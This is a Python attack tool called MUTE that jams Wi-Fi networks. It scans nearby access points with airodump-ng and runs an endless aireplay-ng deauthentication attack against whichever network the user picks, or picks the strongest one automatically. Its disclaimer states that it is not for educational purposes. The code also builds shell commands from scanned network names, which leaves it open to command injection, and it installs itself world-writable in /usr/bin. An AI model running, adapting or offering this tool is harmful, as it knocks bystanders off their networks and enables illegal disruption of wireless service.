#!/usr/bin/python3

# -*- coding: utf-8 -*-

"""
MUTE 1.4.4
Developer K4T
Developer f4llen

Licensed under the GNU General Public License Version 3 (GNU GPL v3),
    available at: https://www.gnu.org/licenses/gpl-3.0.txt

(C) 2017 K4YT3X
(C) 2017 fa11en

This program is DESIGNED FOR LINUX SYSTEM.
Program MUST be ran with ROOT ACCESS.

DISCLAIMER: This application is NOT for educational purposes.
Abusing this program might be an ilegal action.
Use this program ON YOUR OWN RISK. The authors of this program
won't be responsible to any results caused by abusing this program.

YOU'RE EXPECTED TO KNOW WHAT YOU'RE DOING

Description: MUTE (WxKill) is an Python Application that kills wifi signals

CHANGELOG:
Version: 1.4.4
Date: 01/22/2017

1. Fixed Installation System


TODO:
1. Continue developing arguments
"""

from __future__ import print_function
import os
import linecache
import csv
import multiprocessing
import shutil
import socket
import argparse
import urllib.request

# Console colors
# Unix Console colors
W = '\033[0m'  # white (normal / reset)
R = '\033[31m'  # red
G = '\033[32m'  # green
OR = '\033[33m'  # orange
Y = '\033[93m'  # yellow
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[96m'  # cyan
GR = '\033[37m'  # grey
H = '\033[8m'  # hidden
NH = '\033[28m'  # not hidden

AT_IN_MON = False  # True if adapter in monitor mode
DUMP = '/tmp/mute-01.csv'  # The airodump file location
DEV_FILE = '/proc/net/dev'  # System dev file, contains all network interfaces' info
FIRST_START = True
INSTALLED = False
STARTUP = True
VERSION = '1.4.4'


# --------------------------------Function Defining--------------------------------

def check_root():
    print(OR + '[X] STARTUP: ' + W + 'Checking Privilege.............' + W, end='')
    if os.getuid() != 0:
        print(R + 'ERROR' + W)
        print(R + '[!] ERROR: MUTE MUST be run with root access' + W)
        exit(1)
    print(G + 'OK!' + W)


def check_platform():
    print(OR + '[X] STARTUP: ' + W + 'Checking Platform..............' + W, end='')
    if not os.uname()[0].startswith('Linux'):
        print(R + 'ERROR' + W)
        print(R + '[!] ERROR: MUTE can only be run in linux platform')
        exit(1)
    print(G + 'OK!' + W)


def check_version():
    internet = internet_connected()
    print(OR + '[X] STARTUP: ' + W + 'Checking Version...............' + W, end='')
    if internet:
        with urllib.request.urlopen('https://raw.githubusercontent.com/K4YT3X/MUTE/master/mute.py') as response:
            html = response.read()
            server_version = html.decode().split('\n')[5][5:]
            if server_version > VERSION:
                print(R + 'OLD' + W)
                print(G + '[+] INFO: There\'s a new version!' + W)
                while True:
                    upgrade = input('[?] USER: Upgrade to newest version?[Y/n]: ')
                    if upgrade[0].upper() == '' or upgrade[0].upper() == 'Y':
                        sysupdate()
                    elif upgrade[0].upper() == 'N':
                        break
                    else:
                        print('[!] ERROR: Invalid Input!')
                        continue
            else:
                print(G + 'NEWEST!' + W)
        return server_version
    else:
        print(R + 'FAILED' + W)


def process_arguments():
    """
    This funtion takes care of all arguments
    """
    global args
    parser = argparse.ArgumentParser()
    options_group = parser.add_argument_group('OPTIONS')
    options_group.add_argument("-s", "--install", help="-s, --install: Install mute into system", action="store_true")
    options_group.add_argument("-l", "--local", help="-s, --install: Install mute into system locally, work with -s", action="store_true")

    action_group = parser.add_argument_group('ACTIONS')
    action_group.add_argument("-i", "--interface", help="-i [interface], --interface [interface]: Choose Interface", action="store_true")
    action_group.add_argument("-A", "--automatic", help="-A, --automatic: Automatically mutes strongest signal", action="store_true")
    action_group.add_argument("-B", "--batch", help="-B, --batch: Automatically selects the default option", action="store_true")

    args = parser.parse_args()


def internet_connected():
    """
    This fucntion detects if the internet is available
    Returns a Boolean value
    """
    if STARTUP:
        print(OR + '[X] STARTUP: ' + W + 'Checking Internet..............' + W, end='')
    else:
        print(Y + '[+] INFO: ' + W + 'Checking Internet.................' + W, end='')
    try:
        socket.create_connection(('172.217.3.3', 443), 5)  # Test connection by connecting to google
        socket.create_connection(('192.30.253.113', 443), 5)
        print(G + 'OK!' + W)
        return True
    except socket.error:
        print(R + 'NO INTERNET!' + W)
        return False


def check_aircrack():
    """
    Check if Aircrack-NG Suite Is installed in the system
    Install Aircrack-NG Suite if not installed
    """
    print(OR + '[X] STARTUP: ' + W + 'Checking Aircrack..............' + W, end='')
    if os.path.isfile('/usr/bin/aircrack-ng'):
        print(G + 'OK!' + W)
        return True
    else:
        print(R + 'FAILED' + W)
        print(P + '[!] CRITICAL:  Aircrack-NG Suite is not installed!' + W)
        insair = input(Y + '[OPERATION] Do you want MUTE to install it for you? [Y/n]: ' + G)
        print(W, end='', flush=True)
        if insair == '':
            install_aircrack()
            return False
        elif insair[0].upper() == 'Y':
            install_aircrack()
            return False
        elif insair[0].upper() == 'N':
            print(P + '[!] CRITICAL:  MUTE relies on Aircrack-NG suite to run' + W)
            print(P + '[!] CRITICAL:  However, Aircrack-NG Suite is not found' + W)
            if AT_IN_MON:
                print(OR + '\n\n[+] INFO: Adapter Exiting Monitor Mode...' + W)
                disable_monitor(monface)
                print(W, end='', flush=True)
                print(Y + '\n[+] INFO: Exiting MUTE Program\n' + W)
                exit(0)
            else:
                print(Y + '\n\n[+] INFO: Exiting MUTE Program\n' + W)
                exit(0)


def install_aircrack():
    """
    Update apt cache and install aircrack-ng suite from
    default source

    TODO:
        Add the feature adding kali source to sources.list if
            unable to find aircrack-ng in exist sources
    """
    if internet_connected():
        os.system('apt update && apt install aircrack-ng')
        return True
    else:
        print(R + '[!] ERROR:  Internet not Connected!' + W)
        print(P + '[!] CRITICAL:  Unable to install Aircrack-NG Suite!' + W)
        print(Y + '[#] WARNING: Please Check your Internet Connection and Launch the Program Again' + W)
        print(Y + '[#] WARNING: Or Manually Install Aircrack-NG Suite' + W)
        print(P + '[!] CRITICAL:  MUTE relies on Aircrack-NG suite to run' + W)
        print(P + '[!] CRITICAL:  However, Aircrack-NG Suite is not found' + W)
        if AT_IN_MON:
            print(OR + '\n\n[+] INFO: Adapter Exiting Monitor Mode...' + W)
            disable_monitor(monface)
            print(W, end='', flush=True)
            print(Y + '\n[+] INFO: Exiting MUTE Program\n' + W)
            exit(0)
        else:
            print(Y + '\n\n[+] INFO: Exiting MUTE Program\n' + W)
            exit(0)


def sysupdate():
    """
    Update the software by downloading the newest code from GitHub
    This will replace the current file
    """
    if internet_connected():
        os.system('wget https://raw.githubusercontent.com/K4YT3X/MUTE/master/mute.py -O ' + os.path.abspath(__file__))
        return 0
    else:
        print(R + '[!] ERROR:  Not connected to internet!' + W)
        return 1


def install_mute(mode):
    """
    Installs the software by downloading the newest code from GitHub
    This will download mute.py as mute into /usr/bin
    Which can be run without a suffix and acts like a command / bindary file
    """
    internet = internet_connected()
    print(G + '[+] INFO Installing MUTE into System...')
    if internet and mode == 'OL':
        print(G + '[+] INFO: Internet Conencted, Installing the newest version of MUTE into the syetem' + W)
        os.system('wget https://raw.githubusercontent.com/K4YT3X/MUTE/master/mute.py -O /usr/bin/mute')
        os.system('chmod 777 /usr/bin/mute')
        return 0
    elif internet and mode == 'OF':
        print(G + '[+] INFO: Chosen Offline installation ' + Y + '(Might be Outdated!)' + W)
        os.system('cp ' + os.path.abspath(__file__) + ' /usr/bin/mute')
        os.system('chmod 777 /usr/bin/mute')
        return 1
    else:
        print(Y + '[#] WARNING: Not connected to internet!' + W)
        print(Y + '[#] WARNING: Using Offline installation (Might be outdated)' + W)
        os.system('cp ' + os.path.abspath(__file__) + ' /usr/bin/mute')
        os.system('chmod 777 /usr/bin/mute')
        return 1


def is_empty_string(ent):
    """
    Checks if a string is only space
    """
    ent = str(ent)
    for elmt in ent:
        if elmt != ' ':
            return False
    return True


def file_len(fname):
    """
    Determine and returns the file
    length considering number of rows
    """
    i = 1
    with open(fname) as f:
        for i, l in enumerate(f):
            pass
    return i + 1


def enable_monitor(ifx):
    """
    Enables wireless adapter monitor mode
    """
    global AT_IN_MON
    os.system('airmon-ng start ' + ifx)
    if AT_IN_MON is False:
        AT_IN_MON = True


def disable_monitor(ifx):
    """
    Disables wireless adapter monitor mode
    """
    global AT_IN_MON
    os.system('airmon-ng stop ' + ifx)
    if AT_IN_MON is True:
        AT_IN_MON = False


def get_interfaces():
    """
    This Function will display all wireless adapter names by reading linux network file
    It will only output the wireless adapter names
    """
    print(OR, end='', flush=True)
    o = 0
    ifid = 1
    numline = file_len(DEV_FILE)
    while o <= numline:
        ilist = linecache.getline(DEV_FILE, o)
        if 'wlan' not in ilist:
            pass
        else:
            if linecache.getline(DEV_FILE, o)[0] == ' ':
                iface = list(linecache.getline(DEV_FILE, o)[1:])
            else:
                iface = list(linecache.getline(DEV_FILE, o))
            print(str(ifid) + '. ', end='', flush=True)
            ifid += 1
            for x in iface:
                if x != ':':
                    print(x, end='', flush=True)
                elif x == ':':
                    print('')
                    break
        o += 1
    print(W, end='', flush=True)


# Get interface name by id
def get_ifname(xfid):
    """
    Get Interface Name by a given ID
    xfid has to be an integer
    """
    o = 0
    xfsd = 1
    xf = []
    numline = file_len(DEV_FILE)
    while o <= numline:
        ilist = linecache.getline(DEV_FILE, o)
        if 'wlan' not in ilist:
            pass
        elif xfsd == xfid:
            if linecache.getline(DEV_FILE, o)[0] == ' ':
                iface = list(linecache.getline(DEV_FILE, o)[1:])
            else:
                iface = list(linecache.getline(DEV_FILE, o))
            for x in iface:
                if x != ':':
                    xf.append(x)
                elif x == ':':
                    facename = ''.join(xf)
                    return facename
        else:
            xfsd += 1
        o += 1


# Get any existing interfaces in monitor mode
def get_monface(xfid, name):
    """
    Get Interface Name by a given ID
    xfid has to be an integer
    """
    o = 0
    xfsd = 1
    xf = []
    numline = file_len(DEV_FILE)
    while str(name) != '0':
        if str(name) != '0':
            while o <= numline:
                ilist = linecache.getline(DEV_FILE, o)
                if str(name) not in ilist:
                    pass
                else:
                    if linecache.getline(DEV_FILE, o)[0] == ' ':
                        iface = list(linecache.getline(DEV_FILE, o)[1:])
                    else:
                        iface = list(linecache.getline(DEV_FILE, o))
                    for x in iface:
                        if x != ':':
                            xf.append(x)
                        elif x == ':':
                            facename = ''.join(xf)
                            return facename
                o += 1
        return 'NULL'
    while o <= numline:
        ilist = linecache.getline(DEV_FILE, o)
        if 'wlan' not in ilist:
            pass
        elif xfsd == xfid:
            if linecache.getline(DEV_FILE, o)[0] == ' ':
                iface = list(linecache.getline(DEV_FILE, o)[1:])
            else:
                iface = list(linecache.getline(DEV_FILE, o))
            for x in iface:
                if x != ':':
                    xf.append(x)
                elif x == ':':
                    facename = ''.join(xf)
                    return facename
        else:
            xfsd += 1
        o += 1
    return 'NULL'


# Get MAC Address by SSID
def get_macaddr(ssid):
    st = False
    with open(DUMP, 'r') as airodump:
        for row in reversed(list(csv.reader(airodump, delimiter=';'))):
            if "['Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs']" == str(row):
                st = True  # The condition above is used to split client section and AP section
            if len(row) > 0 and len(row[0].split(',')[0]) == 17 and st is True:
                try:
                    if ((row[0].split(','))[13].strip(' ')).upper() == ssid.upper():
                        return row[0].split(',')[0]
                except IndexError:
                    pass
    return 'NULL'


# Give a list of all scanned SSID
def list_ssid():
    """
    Lists all scanned ssids

    Action:
        Prints All Scanned ssids

    Returns:
        [List]: A list of all scanned ssids
    """
    ssids = []
    with open(DUMP, 'r') as dump_file:
        mac = csv.reader(dump_file, delimiter=';')
        for row in mac:
            try:
                ssids.append((row[0].split(','))[13].strip(' '))
            except IndexError:
                pass
        for ssid in ssids:
            while ssid in ssids:
                ssids.remove(ssid)
            ssids.append(ssid)
        for ssid in ssids:
            if is_empty_string(ssid):
                while ssid in ssids:
                    ssids.remove(ssid)
        for ssid in ssids:
            print(str(ssids.index(ssid) + 1) + '. ' + ssid)
        return ssids


def get_channel(ssid):
    """

    Gets the channel an ssid is on

    Arguments:
        ssid: the ssid name looking up

    Returns:
        [string] -- the channel of ssid
    """
    st = False
    with open(DUMP, 'r') as airodump:
        for row in reversed(list(csv.reader(airodump, delimiter=';'))):
            if "['Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs']" == str(row):
                st = True
            if ssid in str(row) and st is True:
                try:
                    chanid = (row[0].split(','))[3].strip(' ')
                    return chanid
                except IndexError:
                    pass
    return 'NULL'


# Scan wifi using airodump-ng and output it into a file
def scan_wlan():
    """
    Executes the system command and scans wifi signals

    Argument for --band:
        a: 5G
        bg: 2.4G
    """
    if os.path.exists(DUMP):
        os.system('rm /tmp/mute-01.csv')
    if str(fg) == '1':
        os.system('airodump-ng --band a -w /tmp/mute --output-format=csv ' + monface)
    else:
        os.system('airodump-ng --band bg -w /tmp/mute --output-format=csv ' + monface)


def airodump_ng():
    """
    Starts a sub-process to scan surrounding Wi-Fi Networks
    """
    scan_wlan_proc = multiprocessing.Process(target=scan_wlan)
    scan_wlan_proc.start()
    while True:
        try:
            print('', end='', flush=True)
            pass
        except KeyboardInterrupt:
            os.system('clear')
            print(OR + "[+] INFO: Finishing airodump..." + W)
            scan_wlan_proc.terminate()
            break


def attack():
    """
    This function executes a system command
    and launches the aireplay attack towards AP
    """
    os.system('clear')
    print('\n' + R + '####################STARTING ATTACK!####################' + W)
    os.system('iwconfig ' + monface + ' channel ' + get_channel(ssid))
    os.system('aireplay-ng --deauth 0 -a ' + get_macaddr(ssid) + ' ' + monface)


def aireplay():
    """
    Controls the attacks function
    Starts attack function in a sub-process
    """
    start_attack_proc = multiprocessing.Process(target=attack)
    start_attack_proc.start()
    while True:
        try:
            print('', end='', flush=True)
            pass
        except KeyboardInterrupt:
            os.system('clear')
            print(G + "[+] INFO: Stopping Attack..." + W)
            start_attack_proc.terminate()
            break


# --------------------------------ICON--------------------------------


def print_icon():
    """
    Prints the MUTE Icon according to the width & height
    """
    global FIRST_START
    if FIRST_START is False:
        os.system('clear')
    width, height = shutil.get_terminal_size((80, 20))
    space = (width - 39) // 2 * ' '
    middle = (height - 20) // 2
    for _ in range(middle - 10):
        print('')  # Which is a '\n'
    print(space + W + '    ####' + R + '#####' + W + '##         ##' + R + '#####' + W + '####')
    print(space + R + '         ####             ####')
    print(space + R + '           ###           ###')
    print(space + R + '              ##       ##')
    print(space + R + '               #########')
    print(space + R + '               #########')
    print(space + R + '              ##       ##')
    print(space + R + '           ###           ###')
    print(space + R + '         ######         ######')
    print(space + W + '########' + R + '#####' + W + '#           #' + R + '#####' + W + '########')
    print('\n')
    if not height < 31:
        space = (width - 37) // 2 * ' '
        print(space + R + '##     ##  ' + W + '##     ## ######## ######## ')
        print(space + R + '###   ###  ' + W + '##     ##    ##    ##       ')
        print(space + R + '#### ####  ' + W + '##     ##    ##    ##       ')
        print(space + R + '## ### ##  ' + W + '##     ##    ##    ######   ')
        print(space + R + '##     ##  ' + W + '##     ##    ##    ##       ')
        print(space + R + '##     ##  ' + W + '##     ##    ##    ##       ')
        print(space + R + '##     ##  ' + W + ' #######     ##    ######## ')
    space = (width - 32) // 2 * ' '
    print('\n' + space + GR + '(C) K4YT3X 2017  (C) fa11en 2017' + W)
    FIRST_START = False


def main():
    """
    The Main Function that controls the flow

    Calls each function such as scan wifi and ask for
        user input
    This is in a while loop for restart since puthon
        doesn't have a goto command
    """
    global monface
    global interface
    global ssid
    global fg
    global AT_IN_MON
    print_icon()

    # Choose Interface
    print(B + '[+] INFO: Here are Your Interfaces:' + W)
    get_interfaces()
    cont = 0
    iface = ''
    print('')
    while cont != 1:
        try:
            iface = int(input('[?] USER: Choose Interface (Enter Number): ' + G))
            print(W, end='', flush=True)
        except ValueError:
            print(R + '[!] ERROR: Invalid Input!' + W)
            pass
        else:
            cont = 1

    interface = get_ifname(iface)

    # Enable Monitor Mode
    while True:
        enmon = input('[?] USER: Enable Monitor Mode on Interface? [Y/n]: ' + G)
        print(W, end='', flush=True)
        if args.batch or enmon == '' or enmon[0].upper() == 'Y':
            print(G, end='', flush=True)
            enable_monitor(interface)
            print(W, end='', flush=True)
            if get_monface(1, 0) == 'NULL':
                print(R + '[!] ERROR: Unable to Enable Monitor Mode!' + W)
                input('[?] USER: Press Any Key to Exit...')
                exit(0)
            else:
                if AT_IN_MON is False:
                    AT_IN_MON = True
                break
        elif enmon[0].upper() == 'N':
            if get_monface(1, 0) == 'NULL' or 'mon' not in interface:
                print(Y + '[#] WARNING: Selected Adapter Not in Monitor Mode!' + W)
                enmon = ('[?] USER: Enable Monitor Mode? [Y/N]: ' + G)
                if args.batch or enmon[0].upper == 'Y':
                    print(G, end='', flush=True)
                    enable_monitor(interface)
                    print(W, end='', flush=True)
                    if get_monface(1, 0) == 'NULL':
                        print(R + '[!] ERROR: Unable to Enable Monitor Mode!' + W)
                        input('Press Any Key to Exit...')
                        exit(1)
                    else:
                        break
                elif enmon[0].upper() == 'N':
                    print(R + '[!] ERROR: Adapter Unusable...Exiting...' + W)
                    input(G + '[?] USER: Press Any Key to Exit...' + W)
                    exit(1)
            else:
                break
        else:
            print(R + 'Invalid Input!' + W)

    if 'mon' in interface:
        monface = interface
    else:
        monface = interface + 'mon'

    while True:
        fg = input('Scan 5G Networks? [y/N]: ' + G)
        print(W, end='', flush=True)
        if args.batch or fg == '' or fg[0].upper() == 'N':
            fg = 0
            break
        elif fg[0].upper() == 'Y':
            fg = 1
            break
        else:
            print(R + 'Invalid Input!' + W)

    print(G + 'Start Scanning Wireless Signals...' + W)
    print(G + 'Press Ctrl^C to Stop' + W)
    # Scan Wireless Network
    airodump_ng()

    # List all networks
    print('Here is a list of Detected APs: ')
    ssids = list_ssid()

    while True:
        if args.batch:
            print(G + '[BATCH] Automatically Selecting the Strongest Signal')
            wid = 1
        else:
            wid = input('Enter the ID of Wi-Fi You want to attack: ' + G)
        print(W, end='', flush=True)
        try:
            wid = int(wid)
            ssid = ssids[wid - 1]
            if len(str(get_macaddr(ssid))) == 17:
                break
            else:
                print(R + '[!] ERROR:  SSID Not Found!' + W)
        except ValueError:
            print(R + '[!] ERROR:  Invalid Input!' + W)
            print(R + '[!] ERROR:  Please enter the number!' + W)

    aireplay()


# --------------------------------Program Entry--------------------------------

try:
    process_arguments()  # Handle All Argument Inputs

    if args.install and args.local:
        os.system('clear')
        install_mute('OF')
        INSTALLED = True
    elif args.install:
        os.system('clear')
        install_mute('OL')
        INSTALLED = True
    else:
        os.system('clear')

    # Check Requirements
    if INSTALLED:
        print(G + '[+] INFO: MUTE Successfully Installed into System!' + W)
    check_root()
    check_platform()
    check_aircrack()
    check_version()
    print(OR + '[X] STARTUP END:' + G + ' ALL OK!\n' + W)
    STARTUP = False
except KeyboardInterrupt:
    if AT_IN_MON:
        print(OR + '\n\n[+] INFO:Adapter Exiting Monitor Mode...' + W)
        disable_monitor(monface)
        print(W, end='', flush=True)
        print(Y + '\n[+] INFO: Exiting MUTE Program\n' + W)
    else:
        print(Y + '\n\n[+] INFO: Exiting MUTE Program\n' + W)
        exit(0)
except Exception as er:
    print(P + '[!] CRITICAL:  Error Detected!' + W)
    print(R + '[!] ERROR: ' + str(er))
    print(R + '[+] INFO: Exiting Program due to Errors...' + W)
    if AT_IN_MON:
        print(OR + '\n\n[+] INFO: Adapter Exiting Monitor Mode...' + W)
        disable_monitor(monface)
        print(W, end='', flush=True)
        print(OR + '\n[+] INFO: Exiting MUTE Program\n' + W)
        exit(0)
    else:
        print(Y + '\n\n[+] INFO: Exiting MUTE Program\n' + W)
        exit(0)


while True:
    try:
        main()  # Call Main function to start program
        if AT_IN_MON:
            print(G + '\n\n[+] INFO: Adapter Exiting Monitor Mode...' + W)
            disable_monitor(monface)
            print(W, end='', flush=True)
            print(Y + '\n[+] INFO: Exiting MUTE Program\n' + W)
        else:
            print(Y + '\n\n[+] INFO: Exiting MUTE Program\n' + W)
        exit(0)
    except KeyboardInterrupt:
        if AT_IN_MON:
            print(OR + '\n\n[+] INFO:Adapter Exiting Monitor Mode...' + W)
            disable_monitor(monface)
            print(W, end='', flush=True)
            print(Y + '\n[+] INFO: Exiting MUTE Program\n' + W)
        else:
            print(Y + '\n\n[+] INFO: Exiting MUTE Program\n' + W)
        exit(0)
    except Exception as er:
        print(P + '[!] CRITICAL:  Error Detected!' + W)
        print(R + '[!] ERROR: ' + str(er))
        while True:
            restart = input('[?] USER: Restart Program? [Y/n]: ' + G)
            print(W, end='', flush=True)
            if restart == '':
                print(Y + '[+] INFO: Restarting MUTE Program' + W)
                break
            elif restart[0].upper() == 'Y':
                print(Y + '[+] INFO: Restarting MUTE Program' + W)
                break
            elif restart[0].upper() == 'N':
                print(R + '[+] INFO: Exiting Program due to Errors...' + W)
                if AT_IN_MON:
                    print(OR + '\n\n[+] INFO: Adapter Exiting Monitor Mode...' + W)
                    disable_monitor(monface)
                    print(W, end='', flush=True)
                    print(OR + '\n[+] INFO: Exiting MUTE Program\n' + W)
                    exit(0)
                else:
                    print(Y + '\n\n[+] INFO: Exiting MUTE Program\n' + W)
                    exit(0)
            else:
                print(R + '[!] ERROR: Invalid Input!' + W)
                pass
        continue
